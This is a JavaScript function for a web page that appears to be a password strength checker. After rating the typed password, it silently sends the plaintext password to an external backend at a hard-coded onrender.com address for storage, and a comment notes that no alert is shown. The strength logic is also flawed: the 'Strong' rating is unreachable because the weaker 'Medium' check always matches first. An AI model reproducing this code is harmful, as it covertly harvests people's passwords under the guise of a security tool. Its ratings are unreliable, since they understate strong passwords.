async function checkAndSavePassword() {
    const password = document.getElementById("password").value;
    const strengthMessage = document.getElementById("strength-message");

    if (!password) {
        return; // Do nothing if no password is entered
    }

    let strength = "";

    // Check password strength
    if (password.length < 6) {
        strength = "Weak";
        strengthMessage.style.color = "red";
    } else if (password.match(/[a-z]/) && password.match(/[A-Z]/) && password.match(/[0-9]/)) {
        strength = "Medium";
        strengthMessage.style.color = "orange";
    } else if (password.match(/[a-z]/) && password.match(/[A-Z]/) && password.match(/[0-9]/) && password.match(/[^a-zA-Z0-9]/)) {
        strength = "Strong";
        strengthMessage.style.color = "green";
    } else {
        strength = "Average";
        strengthMessage.style.color = "blue";
    }

    // Display password strength
    strengthMessage.innerHTML = `Strength: ${strength}`;

    // Store password in MongoDB (No alert message)

   const API_URL = "https://password-checker-ekez.onrender.com"; // ✅ Your backend URL

    await fetch(`${API_URL}/save-password`, { 
    
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password })
    });
}
